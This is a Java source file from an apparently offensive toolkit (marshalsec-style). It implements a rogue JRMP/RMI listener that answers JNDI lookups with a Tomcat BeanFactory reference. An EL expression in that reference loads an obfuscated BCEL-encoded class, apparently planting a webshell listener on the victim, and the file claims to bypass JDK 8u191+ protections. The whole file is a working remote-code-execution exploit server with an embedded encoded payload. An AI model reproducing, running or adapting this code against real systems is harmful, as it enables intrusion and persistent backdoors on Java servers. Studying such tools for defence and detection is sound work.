package marshalsec.jndi;


import com.sun.jndi.rmi.registry.ReferenceWrapper;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.ObjectStreamClass;
import java.io.OutputStream;
import java.io.Serializable;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.net.URL;
import java.net.URLClassLoader;
import java.rmi.MarshalException;
import java.rmi.RemoteException;
import java.rmi.server.ObjID;
import java.rmi.server.UID;
import java.util.Arrays;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javax.naming.NamingException;
import javax.naming.StringRefAddr;
import javax.net.ServerSocketFactory;
import org.apache.naming.ResourceRef;
import sun.rmi.transport.TransportConstants;


/**
 * Generic JRMP listener
 *
 * bypass jdk8u191+
 *
 *         <dependency>
 *             <groupId>org.apache.tomcat</groupId>
 *             <artifactId>tomcat-catalina</artifactId>
 *         </dependency>
 *
 *         <dependency>
 *             <groupId>org.apache.tomcat</groupId>
 *             <artifactId>tomcat-jasper-el</artifactId>
 *         </dependency>
 *
 *         or
 *
 *         <dependency>
 *              <groupId>org.apache.tomcat.embed</groupId>
 *              <artifactId>tomcat-embed-core</artifactId>
 *         </dependency>
 *
 *         <dependency>
 *              <groupId>org.apache.tomcat.embed</groupId>
 *              <artifactId>tomcat-embed-el</artifactId>
 *         </dependency>
 *
 * @author threedr3am
 *
 */
@SuppressWarnings ( {
    "restriction"
} )
public class TomcatELRMIRefServerToLoadListenerBCELWebShell implements Runnable {

    private int port;
    private ServerSocket ss;
    private Object waitLock = new Object();
    private boolean exit;
    private boolean hadConnection;
    private ReferenceWrapper referenceWrapper;


    public TomcatELRMIRefServerToLoadListenerBCELWebShell( int port, ReferenceWrapper referenceWrapper ) throws IOException {
        this.port = port;
        this.referenceWrapper = referenceWrapper;
        this.ss = ServerSocketFactory.getDefault().createServerSocket(this.port);
    }


    public boolean waitFor ( int i ) {
        try {
            if ( this.hadConnection ) {
                return true;
            }
            System.err.println("Waiting for connection");
            synchronized ( this.waitLock ) {
                this.waitLock.wait(i);
            }
            return this.hadConnection;
        }
        catch ( InterruptedException e ) {
            return false;
        }
    }


    /**
     *
     */
    public void close () {
        this.exit = true;
        try {
            this.ss.close();
        }
        catch ( IOException e ) {}
        synchronized ( this.waitLock ) {
            this.waitLock.notify();
        }
    }


    public static final void main ( final String[] args ) {
        if ( args.length < 2 ) {
            System.err.println(
                TomcatELRMIRefServerToLoadListenerBCELWebShell.class.getSimpleName() + " <port> <webshell-listener-port>"); //$NON-NLS-1$
            System.exit(-1);
        }
        int port = Integer.parseInt(args[0]);
        String revPort = args[1];
        System.out.println(String.format("[%d, %s]", port, revPort));
        try {
            ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor",null,"","",true,"org.apache.naming.factory.BeanFactory",null);
            //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
            resourceRef.add(new StringRefAddr("forceString", "x=eval"));
            //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
            String elp = "new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85Wit$hW$V$feF$964$f2xl$t$96$f7$b6I$93$ba$8d$e2M$r$a1K$9c$c4$Q$a7np$91$97$c6I$8cbh$Z$cbc$7b$Sm$8cFYZ$a0eK$v$a5$85B$e9$c2$O$BD$81R$d26R$a8C$d9m$uKY$L$z$fc$e3$i$7e$f0$D8$87$c3$P8i$cd$f7f$q$7bd$cb$e5$f8$e8$bd$99$7b$ef$bb$df$7d$f7$7e$ef$ce$f3$f3$af$3e$fb$i$80$d7$e3$cf$Kv$o$5e$8dZ$qd$q$VT$n$r$86$b4$90$bcC$M$a6$Y22$y$FY$9cPP$8d$93b8$r$e3$b4B$cd$j2$ee$94$f1N$F$h$f0$$$F$f5x$b7$8c$bbd$dc$ad$a0$R$efQ$Q$c4$7b$c5$f0$3e$a1y$bf$Y$3e$m$8632$eeQ$f0A$dc$h$c0$87$c4$7c$9f$8c$P$x$d8$8c$b8$Y$eeW$f0$A$3e$o$86$8f$w$b8$M$P$w$f8$Y$ee$TH$l$XO$P$c9$f8$84$82$87$f1H$A$8f$wx$M$9fT$f0$v$7cZ$M$9fQ$f0Y$7c$ae$g$9f$c7$X$C$f8$a2$f0tV$c1$97$f0e$Z_$91$91$93$e0$cf$a4b$c7uK$c2$c6$c81$ed$84$WN$eaVx$dc$W$ed$96$e0M$a7L$aa$g$iU$5cK$ce$86$c7$z$d3H$ceRWc$q$d3Y$8b$af$ba$96$90$d0$e4$98$Y$a9$f0$d0$8a$98Vj$wk$b9$cc$9a$97$cdF$5dr$da$f9$f7$YI$c3$ea$a7$a3$d0Z$b0$edG$Y$ca$fe$d4$b4$$$a1$3eb$q$f5$91lbJ7$PiSq$5d$E$97$8ai$f1$p$9ai$88$f7$a2$d0k$cd$Z$Za$7dh$ce$d4$f5is$a7$96$88F$a3$c4i$M$ad$d9$a6$f0$de$h$aa$Y$7f$e5h$c5$82$w3$9b$e4$Y$S$cfjF7O$e8$e6x1$91$z$$$E$97$82$e0UV$o$z$a1n$w$3b3$a3$9b$fa$f4$84iX$ba$v$a1u$Zf$a0L$p$K$40$c0$e9J$W$H$v$b7$z$7cq$sd$87$EI_$$$82$9d$ba$c1S1$3dm$Z$a9$qmj3v$k$H$b2F$7cZ$A$b6$adIqQ$r$Q$85$3f$86$9a6S$S$82$$$c313$V$d33$99$dd$ae$N8A$d0$ff$b8$a5$c5$8e$Pki$3b$fb$3c$T6$f9$c9$f7$7b$c8$60$Z_$e5$99$90$f18$vJ$f7$J$cd$60$e2$9aC$93$eb$94Y3gY$b8$60$F5$f7$3au$da$d2$a9$f5L$O$d02f$TBY$de$u$V$cax$wk$c6$f4$9b$N$9b$Ye$b5$ef$V$feT$ec$c5$B$V7$e0F$J$hV$A$84$a16$z$94_S$f1uaq$j$aeW$b1$L$7d$wvc$P$T$5b$b1$a22$be$a1$e2$J$7cS$y$7cR$c5$b7p$8e$a9$u$D$V$9a$9b$b8$db$ca$f5$95$d0$5e$89_$8eR$y$7dJ$MOWX_J$7c$5b$F$d2$3a$3a$b1$f2$Z1$9cW$91GA$c5$F$f4$ab$f8$b6$d8$db$b38$c0$EW$60$8a$8cy$V$X$f1$j$J$81L6$s$8a$bdE$c5s$f8$$$v$bd$O_T$7c$P$df$97$f1$D$V$3f$c4$8fT$fc$Y$L$w$WQ$60$b1$F$f4$a0$8a$9f$88$d5$c1$e5$uG$5dX$3fU$f1$3c$7eFmy$99bq$z$c3$b6$fas$V$bf$c0$_e$bc$a0$e2W$f8$b5$8aa$fcF$c6oU$fc$O$bf$97$f1$a2$8a$3f$e0$8f$M$b3$a3c$60$ff$60$a4$a3C$c5K$C$f5e$V$7fB$7fYiG$a7$8e$e91$d1$c2VD$H$b3$c9$a4$d3$r6$ac$de$W$bb$e0$g$c2s$f7$ee$96TZm$b3$d5$97$b14$d1$m$5d$ab$86$92$96$3e$xj$THkfF$e7$eb$3a$3dm$88$U$O$N$J$_$7e$z$s$b2$c2T$84$b6Wh$c2m$a1$f5$dbPpEW$ec$ZB$daZ$b9$9b$adZPl$nB$g$Q$fc$8f$d8$H$bf$b1$U$c3$aa$a3wR$b8$97$m$t$f5$93$8e$a1o$s$9e$cd$cc$b1$c7$ae$8a$98$92Y$dd$g$zk$fb$ad$r$a7k$h$7f$j$8d$87$dc_$92$W$97m$f9$b7$c4$af$a5$d3z$92$ed$b0$a7R$3e_$a3$a7m$y$x$9fe$qD$df$m$ee$f2KS$d9$a6$8bb$d1$M$f5SzL$c2$b6$ff$83$b7$d2$g$85$d7a$3ej$b3$ba$b3$b5A$d3L$99$a5$ad$d5$af$y$d9$_h$ee$98$d8$8f$91T$f1D$97E$e2R$ed$$u$a1$d5$K$d6TlE$cf$d8$ado_$a6$E$b6$7d$fd$a0$d7d6XA$y$a1$9aB$p$ee$i$V$7e$e9HX_hr$40$cc$3bb$a9D8$93M$86S$e6lXKk$b19$3d$3c$V$d3$e3a$83$ec7$93Z$3cl$l$e3$Z$f6$e1$f0a$cb$88$h$d6i$96OO$3a$z$bb$85$5e$8eVd$99$fb$40$9e$ceX$3a$83$a8$e2$F$c2$7d$bd$Y$a3$e9J$e0$B$xU$3a$b9$c1$K$W$e4kZ$bc$c5$93$d8$c2$ab$d2NH$bc$day$e1$R$fd$9d$d7$3c$8f$f8$S$d83$5b$bd$3d$b3$dbs$f6$d1n$_$fa9$be$81o$87y$ef$f3pn$ea$y$40$ea$ec$3a$P$cf$3c$aa$a2$7c$f1$e6$e1$3bg$_$7b$p$c7$G$3a$GZ8$b6$f2$k$d8$c6$8b$5e$3b$f6Q$d2$ec$y$c6$A$f6$D$f6$93$A$95l$88$9b$d6$83$f0$bf$G$c4$e5$i$af$m$c4$sBl$5e$HB$ec$cf$81$Y$yB$cc$R$a2$8as$7b$JB$ee$ec$3e$8f$40E$9cff$A$cc$98$X$5b$89s$V$ea$d0$c1$N$5dmc$5d$e9xY$c6j$b7s$t$d9O$o$7b$k$3e$df$8c$D$O$aa$e7ez$92$B$a9$bf$f3$Z$f8$Xq$j$ty$R$bd$9c$C$8b$d86$8f$ea$u$l$3d$X$a0$UP$T$e9$caC$8d$O$_$a0$7e$k$b5$d1$ee$C$ea$srK$7f$X$x$W0$sV$y$60h$k$f5$d1yl$Q$ab$C$Fl$y$f0$f67$8f$mE$8dB$q$X$d0T$40$f3pw$k$z$d1$91$F$E$bbz$f2h$a5$db6$fe$dasK$7f$cb$e1$e9H$OO$ba$bc$f8$f3$b8$bc$e8$a8$ab$e1$K$97$b5$cb$zm6$V$3d$cfcs$b4$80$xGl$84$3e$ef$oj$7b$da$98$bb$z$8c$f4$lR$9f$ef$C$b6$8a$d7$ab$fa$7c94$f7$f9$bb$da$b8$b4$c3$e5$b4$cd$b7$I$7fn$e9$a2$d8$60$9b$_$8f$ab$97$p$b8f$a2$q$db$e6$92$e5$96$k$cc$c1$h9$c7$9c$l$c0$Z$dc$cb$8b$ff_$f1O$fc$8b3$a4$5d$d2$k$84$a8$R$V$7b$80U$C$3aY$f9$$$d6$aa$87$7f$bd$ac$cb$b5$5c$b5$DG$c9$fb$E$Zq$82$9c$b8$93$e4$bb$8b$f4$3b$c3$9a$dd$cfj$3dF$86$9c$r$d3$lg$b5$9e$a0$a7s$ac$eb$oi$f9$Ck$f8$SW$ff$FCD$7c31$c7$88$g$c1$bf$f9$n$7e$V$p$92$H$a3$92$l$b7J58$u$d5$e1$b0$b4$VG$a4$eb1$n$ed$c2Qi$_$sm$a6$dc$B$95$b14$e1M$f4$n1$b6z$dc$c2$I$3c$8c$a7$9b$k$p$94$r$c8$aaa$8cP$96$e1$7fC$a3$8c$ab$8a$I$h$89u$x$fc$8ca$W$H1N$d9$8bx$3b$OQ$ebe$yc$3c$yG$c8$aa$b3$fco$c7$f1$b2$I$T$T$b6$X$f2$ac$c8$cb$b7$f0w$h$ea$_$a1CF$f4$bfh$7c$F$3be$i$951$f9$l$b4$O$c8xk$d5$x$d8$e5$I$$A$96$f1$b6K$I$ca$b8m$891$fae$dc$eeh$u$a6L$s$b6$c4$V$N$f2$S$f7$c0$a7$db$Bz$d0$c0$931$85$YQ$c5$e9z$88Q$8a$b3ycCm$k$db$h$3a$f3$e8$St$ee$be$Y$Y$ee$oWz$s$ba$bd$X$d0$3b$f2$U$c2E$G5$5cK$d6$90$9d$5b$f2x$5d$k$3bV$ce$5e$3bw$$b$af$nP$D$b1$5b$J$b5$89H7$Qk$9f$5dc$h$H$d3$d09$d7$b0$d2$ce$f9k$c05$98a$c6$3c$b4n$e7i$X$b94h$e1$a5$ee2$fe$8e$d9$I$c7$ff$H3$92$d5q$e1$O$A$A').getConstructor(java.lang.String.class).newInstance('" + revPort + "')";
            String el = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"" + elp + "\")";
            resourceRef.add(new StringRefAddr("x", el));
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);

            System.err.println("* Opening JRMP listener on " + port);
            TomcatELRMIRefServerToLoadListenerBCELWebShell c = new TomcatELRMIRefServerToLoadListenerBCELWebShell(port, referenceWrapper);
            c.run();
        } catch (RemoteException e) {
            e.printStackTrace();
        } catch (NamingException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    @Override
    public void run () {
        try {
            @SuppressWarnings ( "resource" )
            Socket s = null;
            try {
                while ( !this.exit && ( s = this.ss.accept() ) != null ) {
                    try {
                        s.setSoTimeout(5000);
                        InetSocketAddress remote = (InetSocketAddress) s.getRemoteSocketAddress();
                        System.err.println("Have connection from " + remote);

                        InputStream is = s.getInputStream();
                        InputStream bufIn = is.markSupported() ? is : new BufferedInputStream(is);

                        // Read magic (or HTTP wrapper)
                        bufIn.mark(4);
                        try ( DataInputStream in = new DataInputStream(bufIn) ) {
                            int magic = in.readInt();

                            short version = in.readShort();
                            if ( magic != TransportConstants.Magic || version != TransportConstants.Version ) {
                                s.close();
                                continue;
                            }

                            OutputStream sockOut = s.getOutputStream();
                            BufferedOutputStream bufOut = new BufferedOutputStream(sockOut);
                            try ( DataOutputStream out = new DataOutputStream(bufOut) ) {

                                byte protocol = in.readByte();
                                switch ( protocol ) {
                                case TransportConstants.StreamProtocol:
                                    out.writeByte(TransportConstants.ProtocolAck);
                                    if ( remote.getHostName() != null ) {
                                        out.writeUTF(remote.getHostName());
                                    }
                                    else {
                                        out.writeUTF(remote.getAddress().toString());
                                    }
                                    out.writeInt(remote.getPort());
                                    out.flush();
                                    in.readUTF();
                                    in.readInt();
                                case TransportConstants.SingleOpProtocol:
                                    doMessage(s, in, out);
                                    break;
                                default:
                                case TransportConstants.MultiplexProtocol:
                                    System.err.println("Unsupported protocol");
                                    s.close();
                                    continue;
                                }

                                bufOut.flush();
                                out.flush();
                            }
                        }
                    }
                    catch ( InterruptedException e ) {
                        return;
                    }
                    catch ( Exception e ) {
                        e.printStackTrace(System.err);
                    }
                    finally {
                        System.err.println("Closing connection");
                        s.close();
                    }

                }

            }
            finally {
                if ( s != null ) {
                    s.close();
                }
                if ( this.ss != null ) {
                    this.ss.close();
                }
            }

        }
        catch ( SocketException e ) {
            return;
        }
        catch ( Exception e ) {
            e.printStackTrace(System.err);
        }
    }


    private void doMessage ( Socket s, DataInputStream in, DataOutputStream out ) throws Exception {
        System.err.println("Reading message...");

        int op = in.read();

        switch ( op ) {
        case TransportConstants.Call:
            // service incoming RMI call
            doCall(in, out);
            break;

        case TransportConstants.Ping:
            // send ack for ping
            out.writeByte(TransportConstants.PingAck);
            break;

        case TransportConstants.DGCAck:
            UID.read(in);
            break;

        default:
            throw new IOException("unknown transport op " + op);
        }

        s.close();
    }


    private void doCall ( DataInputStream in, DataOutputStream out ) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(in) {

            @Override
            protected Class<?> resolveClass ( ObjectStreamClass desc ) throws IOException, ClassNotFoundException {
                if ( "[Ljava.rmi.server.ObjID;".equals(desc.getName()) ) {
                    return ObjID[].class;
                }
                else if ( "java.rmi.server.ObjID".equals(desc.getName()) ) {
                    return ObjID.class;
                }
                else if ( "java.rmi.server.UID".equals(desc.getName()) ) {
                    return UID.class;
                }
                else if ( "java.lang.String".equals(desc.getName()) ) {
                    return String.class;
                }
                throw new IOException("Not allowed to read object");
            }
        };

        ObjID read;
        try {
            read = ObjID.read(ois);
        }
        catch ( IOException e ) {
            throw new MarshalException("unable to read objID", e);
        }

        if ( read.hashCode() == 2 ) {
            // DGC
            handleDGC(ois);
        }
        else if ( read.hashCode() == 0 ) {
            if ( handleRMI(ois, out) ) {
                this.hadConnection = true;
                synchronized ( this.waitLock ) {
                    this.waitLock.notifyAll();
                }
                return;
            }
        }

    }


    /**
     * @param ois
     * @param out
     * @throws IOException
     * @throws ClassNotFoundException
     * @throws NamingException
     */
    private boolean handleRMI ( ObjectInputStream ois, DataOutputStream out ) throws Exception {
        int method = ois.readInt(); // method
        ois.readLong(); // hash

        if ( method != 2 ) { // lookup
            return false;
        }

        String object = (String) ois.readObject();
        System.err.println("Is RMI.lookup call for " + object + " " + method);

        out.writeByte(TransportConstants.Return);// transport op
        try ( ObjectOutputStream oos = new MarshalOutputStream(out, this.referenceWrapper) ) {

            oos.writeByte(TransportConstants.NormalReturn);
            new UID().write(oos);

            oos.writeObject(referenceWrapper);

            oos.flush();
            out.flush();
        }
        return true;
    }


    /**
     * @param ois
     * @throws IOException
     * @throws ClassNotFoundException
     */
    private static void handleDGC ( ObjectInputStream ois ) throws IOException, ClassNotFoundException {
        ois.readInt(); // method
        ois.readLong(); // hash
        System.err.println("Is DGC call for " + Arrays.toString((ObjID[]) ois.readObject()));
    }


    @SuppressWarnings ( "deprecation" )
    protected static Object makeDummyObject ( String className ) {
        try {
            ClassLoader isolation = new ClassLoader() {};
            ClassPool cp = new ClassPool();
            cp.insertClassPath(new ClassClassPath(Dummy.class));
            CtClass clazz = cp.get(Dummy.class.getName());
            clazz.setName(className);
            return clazz.toClass(isolation).newInstance();
        }
        catch ( Exception e ) {
            e.printStackTrace();
            return new byte[0];
        }
    }

    public static class Dummy implements Serializable {

        private static final long serialVersionUID = 1L;

    }

    static final class MarshalOutputStream extends ObjectOutputStream {

        private ReferenceWrapper referenceWrapper;


        public MarshalOutputStream ( OutputStream out, ReferenceWrapper referenceWrapper ) throws IOException {
            super(out);
            this.referenceWrapper = referenceWrapper;
        }


        MarshalOutputStream ( OutputStream out ) throws IOException {
            super(out);
        }


        @Override
        protected void annotateClass ( Class<?> cl ) throws IOException {
            if ( this.referenceWrapper != null ) {
                writeObject(referenceWrapper.toString());
            }
            else if ( ! ( cl.getClassLoader() instanceof URLClassLoader ) ) {
                writeObject(null);
            }
            else {
                URL[] us = ( (URLClassLoader) cl.getClassLoader() ).getURLs();
                String cb = "";

                for ( URL u : us ) {
                    cb += u.toString();
                }
                writeObject(cb);
            }
        }


        /**
         * Serializes a location from which to load the specified class.
         */
        @Override
        protected void annotateProxyClass ( Class<?> cl ) throws IOException {
            annotateClass(cl);
        }
    }
}
